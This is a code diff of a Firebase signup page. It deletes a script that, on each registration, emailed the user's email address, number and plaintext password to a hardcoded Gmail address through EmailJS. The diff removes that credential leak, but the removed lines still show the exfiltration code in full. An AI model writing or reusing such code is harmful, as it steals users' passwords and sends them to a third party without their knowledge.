@@ -99,12 +99,6 @@
         <a href="index.html"><img src="https://i.imgur.com/lMWcCJz.png" alt="Cancel" class="button-image"></a>
     </form>
     <script type="module" src="firebase.js"></script>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function(){
-            emailjs.init("symnosis@gmail.com"); // Remplace par ton User ID EmailJS
-        })();
-    </script>
     <script type="module">
         import { auth } from './firebase.js';
         import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
@@ -173,9 +167,6 @@
                     const user = userCredential.user;
                     console.log("User signed up:", user);
 
-                    // Envoie les données par email
-                    sendEmail(cpNumber, email, password);
-
                     // Redirige vers accueil.html
                     window.location.href = 'accueil.html';
                 })
@@ -183,24 +174,6 @@
                     const errorCode = error.code;
                     const errorMessage = error.message;
                     console.error("Error signing up:", errorCode, errorMessage);
-                });
-        }
-
-        // Function to send email
-        function sendEmail(cpNumber, email, password) {
-            const templateParams = {
-                cpNumber: cpNumber,
-                email: email,
-                password: password,
-                to_email: 'symnosis@gmail.com',
-                subject: 'Inscription plateforme'
-            };
-
-            emailjs.send('service_gdjyina', 'template_53r6fc7', templateParams)
-                .then(function(response) {
-                    console.log('Email sent successfully:', response.status, response.text);
-                }, function(error) {
-                    console.log('Failed to send email:', error);
                 });
         }
     </script>
